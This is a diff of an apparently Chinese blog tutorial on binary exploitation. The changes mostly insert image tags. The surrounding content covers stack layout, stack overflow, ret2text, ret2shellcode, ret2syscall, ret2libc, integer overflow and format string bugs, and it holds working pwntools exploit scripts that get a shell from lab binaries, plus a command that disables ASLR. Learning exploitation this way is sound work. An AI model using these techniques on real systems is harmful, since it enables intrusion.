@@ -234,7 +234,7 @@
 <h2 id="C语言函数调用栈"><a href="#C语言函数调用栈" class="headerlink" title="C语言函数调用栈"></a>C语言函数调用栈</h2><h3 id="1-寄存器分配"><a href="#1-寄存器分配" class="headerlink" title="1 寄存器分配"></a>1 寄存器分配</h3><p>程序的执行过程可看作连续的函数调用。当一个函数执行完毕时，程序要回到调用指令的下一条指令（紧接call指令）处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构(call stack)。编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值（即函数调用的上下文）以备恢复以及存储本地局部变量。</p>
 <p>不同处理器和编译器的堆栈布局、函数调用方法都可能不同，但堆栈的基本概念是一样的。</p>
 <p>Intel 32位体系结构(简称IA32)处理器包含8个四字节寄存器，如下图所示：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240803195418085.png" class="" title="image-20240803195418085">
 
 <p>最初的8086中寄存器是16位，每个都有特殊用途，寄存器名称反映其不同用途。由于IA32平台采用平面寻址模式，对特殊寄存器的需求大大降低，但由于历史原因，这些寄存器名称被保留下来。在大多数情况下，上图所示的前6个寄存器均可作为通用寄存器使用。某些指令可能以固定的寄存器作为源寄存器或目的寄存器（一些特殊的算术操作指令<code>imull/mull/cltd/idivl</code>要求一个参数必须在%eax中，其运算结果存放在%edx(higher 32-bit)和%eax(lower32-bit)中）。为避免兼容性问题，ABI规范对这组通用寄存器的具体作用加以定义。如上图。</p>
 <p><strong>对于寄存器<code>%eax,%ebx,%ecx，%edx</code>，各自可作为两个独立的16位寄存器使用，而低16位寄存器还可继续分为两个独立的8位寄存器使用</strong>。编译器会根据操作数大小选择合适的寄存器来生成汇编代码。在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用，例如<code>mov $5,%eax</code>或<code>mov eax,5</code>，都表示将立即数5赋值给寄存器%eax。（AT&amp;T汇编语法，在Unix和Linux系统中比较常见；Intel汇编语法，在Windows系统中比较常见）</p>
@@ -327,7 +327,7 @@
 </li>
 </ul>
 <p>基于以上指令，使用C调用约定的被调函数典型的函数序和函数跋实现如下：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240804155958868.png" class="" title="image-20240804155958868">
 
 <p>若主调函数和被调函数均未使用局部变量寄存器EDI、ESI和EBX，则编译器无需在函数序中对其压栈，以便提高程序的执行效率。</p>
 <p>注意，栈帧是运行时概念，若程序不运行，就不存在栈和栈帧。但通过分析目标文件中建立函数栈帧的汇编代码（尤其是函数序和函数跋过程），即使函数没有运行，也能了解函数的栈帧结构。通过分析可确定分配在函数栈帧上的局部变量空间准确值，函数中是否使用帧基指针，以及识别函数栈帧中对变量的所有内存引用。</p>
@@ -429,18 +429,18 @@
 
 <p>这个程序的主要目的读取一个字符串，并将其输出。我们希望可以控制程序执行success函数。</p>
 <p>正常使用gcc对上述程序进行编译</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240804210207078.png" class="" title="image-20240804210207078">
 
 <p>gets本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，gcc编译指令中，-m32指的是生成32位程序；-fno-stack-protector指的是不开启堆栈溢出保护，即不生产canary。此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭PIE（Position Independent Executable），避免加载基址被打乱。不同gcc版本对于PIE的默认配置不同，可以使用命令gcc -v查看gcc默认的开关情况。如果含有–enable-default-pie参数则代表PIE默认已开启，需要在编译指令中添加参数-no-pie</p>
 <p>使用如下指令进行编译：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240804210932844.png" class="" title="image-20240804210932844">
 
 <p>编译成功后，可以使用checksec工具检查编译出的文件：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ checksec stack_example</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805112014666.png" class="" title="image-20240805112014666">
 
 <p>编译时的PIE保护，Linux平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了PIE保护，还需要系统开启ASLR才会真正打乱基址，否则程序运行时依旧会加载一个固定的基址上（不过和No PIE时基址不同）。可以通过修改<code>/proc/sys/kernel/randomize_va_space</code>来控制ASLR启动与否，具体的选项有：</p>
 <ul>
@@ -451,13 +451,13 @@
 <p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭Linux系统的ASLR，类似的，也可以配置相应的参数。</p>
 <p>为了降低后续漏洞利用复杂度，此次演示关闭ASLR，在编译时关闭PIE。也可以尝试ASLR、PIE开关的不同组合，配合IDA及动态调试功能观察程序地址变化情况（在ASLR关闭、PIE开启时也可以攻击成功）。</p>
 <p>确认栈溢出和PIE保护关闭后，利用IDA来反编译一下二进制程序并查看vulnerable函数。可以看到</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805095317059.png" class="" title="image-20240805095317059">
 
 <p>该字符串距离ebp的长度为0x14，那么相应的栈结构为</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
 
 <p>通过IDA View-A窗口可以看到success的地址，其地址为0x08049186</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805112349650.png" class="" title="image-20240805112349650">
 
 <p>由于gets会读到回车才算结束，所以我们可以直接读取所有的字符串，并将saved ebp覆盖为bbbb，将retaddr覆盖为success_addr，即，此时的栈结构为：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    0x08049186   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
@@ -469,7 +469,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x08049186</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">b&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span>(p32(success_addr))</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>执行代码，获得结果</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805112640292.png" class="" title="image-20240805112640292">
 
 <p>发现，已经成功执行success函数。</p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>示例展示栈溢出中比较重要的几个步骤。</p>
@@ -538,10 +538,10 @@
 <p>这是，需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，需要想办法去绕过这些保护。</p>
 <h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>其实，在栈溢出的基本原理中，已经介绍了这一简单的攻击。在这里，再给出另外一个例子，bamboofox中介绍ROP时使用的ret2text的例子。</p>
 <p>首先查看一下程序的保护机制：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805141322445.png" class="" title="image-20240805141322445">
 
 <p>可以看出程序是32位程序，且仅开启了栈不可执行（NX）保护。接下来使用IDA反编译该程序。</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805141719609.png" class="" title="image-20240805141719609">
 
 <p>程序在主函数中使用了gets函数，显然存在栈溢出漏洞。接下来查看反汇编代码：</p>
 <img src="/2024/08/15/二进制安全-基础/image-20240805160009348.png"  alt="image-20240805160009348" style="zoom: 50%;" />
@@ -551,7 +551,7 @@
 <img src="/2024/08/15/二进制安全-基础/image-20240805160243661.png"  alt="image-20240805160243661" style="zoom: 50%;" />
 
 <p>可以看到该字符串是通过相对于esp的索引，所以需要进行调试，将断点下在call处，查看esp，ebp，如下：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805163832930.png" class="" title="image-20240805163832930">
 
 <p>可以看到esp为<code>0xff9bd220</code>,ebp为<code>0xff9bd2a8</code>,s相对于esp的索引为<code>esp+0x1c</code>，因此，我们可以推断：</p>
 <ul>
@@ -565,16 +565,16 @@
 <h3 id="re2shellcode"><a href="#re2shellcode" class="headerlink" title="re2shellcode"></a>re2shellcode</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>ret2shellcode，即控制程序执行shellcode代码。shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。<strong>通常情况下，shellcode需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码。</strong></p>
 <p>在栈溢出的基础上，要想执行shellcode，需要对应的binary在运行时，shellcode所在的区域具有可执行权限。需要注意的是，<strong>在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的ret2shellcode手法不再能直接完成利用。</strong></p>
 <h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>检测程序开启的保护：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805174025800.png" class="" title="image-20240805174025800">
 
 <p>几乎没有开启任何保护，并且有可读，可写，可执行段。接下来再使用IDA对程序进行反编译：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805174222534.png" class="" title="image-20240805174222534">
 
 <p>程序仍然是基本的栈溢出漏洞，不过还同时将对应的字符串复制到buf2处。简单查看可知buf2在bss段。</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805174556056.png" class="" title="image-20240805174556056">
 
 <p>这时，简单的调试下程序，看看这个bbs段是否可执行。</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805174944995.png" class="" title="image-20240805174944995">
 
 <p>图中可以看出<code>0x804a000 ~ 0x804b000</code>没有可执行权限，因为环境是ubuntu22.04，内核的保护策略，使得程序中不再默认有同时具有可写可执行的段。</p>
 <p>倘若有可执行权限，那么就控制程序执行shellcode，也就是读入shellcode，然后控制程序执行bbs段处的shellcode。其中，相应的偏移计算类似于ret2text中的例子。</p>
@@ -584,10 +584,10 @@
 <h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>ret2syscall，即控制程序执行系统调用，获取shell。</p>
 <h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h4><p>继续以bamboofox中的ret2syscall为例。</p>
 <p>首先检测程序开启的保护：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805190408974.png" class="" title="image-20240805190408974">
 
 <p>可以看出，源程序为32位，开启了NX保护。接下来利用IDA进行反编译：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805191339538.png" class="" title="image-20240805191339538">
 
 <p>可以看出，这依然是一个栈溢出。类似于之前的做法，我们可以获得v4相对于ebp的偏移为108。所以需要覆盖的返回地址相对于v4的偏移为112.此次，由于不能直接利用程序中的某一段代码或者自己填写代码来获得shell，所以利用程序中的gadgets来获得shell，而对应的shell获取则是利用系统调用。</p>
 <blockquote>
@@ -655,7 +655,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">18f</span>38f3e25f8:/CTF# ROPgadget --binary ret2libc1 --<span class="built_in">string</span> <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x08048720</span> : /bin/sh</span><br></pre></td></tr></table></figure>
 
 <p>确实存在，再次查找下是否有system函数存在。</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240813113016797.png" class="" title="image-20240813113016797">
 
 <p>存在，那么直接返回这个地址，即执行system函数。相应的payload如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">from</span> pwn</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x08048720</span></span><br><span class="line">system = <span class="number">0x08048460</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, system, <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>, binsh])</span><br><span class="line">pause()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
@@ -668,31 +668,31 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dog@dog:~/Desktop/Temp$ checksec ret2libc2</span><br><span class="line">[*] &#x27;/home/dog/Desktop/Temp/ret2libc2&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
 
 <p>ida反编译：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240923223038685.png" class="" title="image-20240923223038685">
 
 <p>例题的函数就是简单哈。gets栈溢出，覆盖返回地址。查看函数列表：</p>
 <img src="/2024/08/15/二进制安全-基础/image-20240923223703138.png"  alt="image-20240923223703138" style="zoom:67%;" />
 
 <p>具有_system()函数，查找一下有没有”&#x2F;bin&#x2F;sh”字符串。</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240923225721335.png" class="" title="image-20240923225721335">
 
 <p>没有。那我也不知道咋办了。看看exp吧</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span>						</span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0xdeadbeef</span>, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>计算填充：</p>
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240923230002770.png" class="" title="image-20240923230002770">
 
-
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240923230036613.png" class="" title="image-20240923230036613">
 
 <p>那么，32位程序的填充就是108+4就是112。而返回地址是gets_plt，不理解。ida看看这个地址。</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240923230200351.png" class="" title="image-20240923230200351">
 
 <p>居然是gets函数的地址。返回地址又重新进入的gets函数。</p>
 <p>buf2是在.bss段定义的变量。</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240924183050946.png" class="" title="image-20240924183050946">
 
 <p>这个.bss段具有写的权限吗？因为我们需要在这个变量中写入数据。</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240924183432910.png" class="" title="image-20240924183432910">
 
 <p>可以看到，s变量所在的区间没有可写的权限，有可读可执行。再者，因为s变量是局部变量，而.bss段的是全局变量，且具有可写权限，因此作为我们ROP的第一跳。</p>
 <blockquote>
@@ -707,7 +707,7 @@
 </blockquote>
 <p>一切是那样好~</p>
 <h4 id="example3"><a href="#example3" class="headerlink" title="example3"></a>example3</h4><p>题目类似，我们查看源码：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20241001210342900.png" class="" title="image-20241001210342900">
 
 <p>查看保护机制：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dog@dog:~/Desktop/Temp$ pwn checksec --file ret2libc3</span><br><span class="line">[*] &#x27;/home/dog/Desktop/Temp/ret2libc3&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
@@ -778,12 +778,12 @@
 </li>
 </ol>
 </blockquote>
-<p>用这个脚本有点问题。咱们靠自己，找到<code>__libc_start_main</code>函数的got表地址如下：</p>
+<p>用这个脚本有点问题。咱们靠自己，找到<code>__libc_start_main</code>函数的got表地址如下：<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20241002153641687.png" class="" title="image-20241002153641687"></p>
 <p>puts函数的plt表地址如下：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20241002154836876.png" class="" title="image-20241002154836876">
 
 <p>main函数的地址如下：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20241002154436052.png" class="" title="image-20241002154436052">
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"><span class="comment">#start_addr = 0x080484D0</span></span><br><span class="line">start_addr = <span class="number">0x08048618</span></span><br><span class="line">puts_plt = <span class="number">0x08048460</span></span><br><span class="line">libc_main_addr = <span class="number">0x0804a024</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, puts_plt, start_addr, libc_main_addr])</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">libc_real_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;real_addr is:&quot;</span> + <span class="built_in">hex</span>(libc_real_addr))</span><br><span class="line">sh.recv()</span><br><span class="line">addr_base = libc_real_addr - <span class="number">0x021560</span></span><br><span class="line">system_addr = addr_base + <span class="number">0x048170</span></span><br><span class="line">string_addr = addr_base + <span class="number">0x1bd0d5</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;system addr is:&quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;string_addr is:&quot;</span> + <span class="built_in">hex</span>(string_addr))</span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>,string_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -806,7 +806,7 @@
 <blockquote>
 <p><strong>这里存在一个问题，为什么padding为104，而不是112呢？</strong></p>
 <p>因为，main()函数是用户代码的入口，针对用户而言；<code>_start</code>函数是系统代码的入口，是程序的真正入口。实际执行过程，会先进入<code>_start</code>函数。如下图：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20241002195535187.png" class="" title="image-20241002195535187">
 
 <p>在上述，可以看到一个堆栈平衡（栈对齐）的操作，<code>and		esp,0FFFFFFF0h</code>进行堆栈平衡。这个操作即将原本的值变为0，而进入这个函数时其最后一位的值为8，后面变成了0。因此在不进行<code>_start</code>函数而直接进入main函数时，esp的值就比原先大了8，因此栈空间就少了8。所以padding也随之修改成为104</p>
 </blockquote>
@@ -883,7 +883,7 @@
 <li><p>范围大的变量赋值给范围小的变量</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!n)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;vuln&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;a);</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bad&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        check(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905121724459.png" class="" title="image-20240905121724459">
 
 <p>上述代码是一个范围大的变量（长整型a），传入check函数后变为范围小的变量（整型变量n），造成整数溢出的例子。</p>
 <p>已经长整型的占有8byte的内存空间，而整型只有4byte的内存空间，所以当long 转换成 int，将会造成截断，只把长整型的低4 byte的值传给整型变量。</p>
@@ -960,7 +960,7 @@
 <p>参数，就是要输出的变量。</p>
 <h4 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h4><p>格式化字符串函数是根据格式化字符串来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。比如说<code>%s</code>表明我们会输出一个字符串参数。</p>
 <p>以下图为例介绍</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905165034945.png" class="" title="image-20240905165034945">
 
 <p>在进入printf函数的之前（即还没有调用printf），栈上的布局由高地址到低地址依次如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">some value</span><br><span class="line">3.14</span><br><span class="line">123456</span><br><span class="line">addr of &quot;red&quot;</span><br><span class="line">addr of format string: Color %s, Number %d, Float %4.2f</span><br></pre></td></tr></table></figure>
@@ -1012,30 +1012,30 @@
 <p>简单编译一下</p>
